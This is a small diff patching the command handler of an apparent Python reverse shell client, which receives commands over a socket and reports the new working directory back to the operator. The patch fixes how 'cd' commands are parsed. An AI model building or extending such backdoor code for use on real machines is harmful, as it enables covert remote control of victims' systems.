@@ -55,8 +55,8 @@ def connect():
                 s.send ( str(e) )  # send the exception error
                 pass
 
-        elif 'cd' in command: # the forumal here is gonna be cd then space then the path that we want to go to, like  cd C:\Users
-            code,directory = command.split (' ') # split up the reiceved command based on space into two variables
+        elif 'cd ' in command: # the forumal here is gonna be cd then space then the path that we want to go to, like  cd C:\Users
+            code,directory = command.split(" ") # split up the reiceved command based on space into two variables
             os.chdir(directory) # changing the directory 
             s.send( "[+] CWD Is " + os.getcwd() ) # we send back a string mentioning the new CWD Note, os.getcwd should stop it from hanging
 
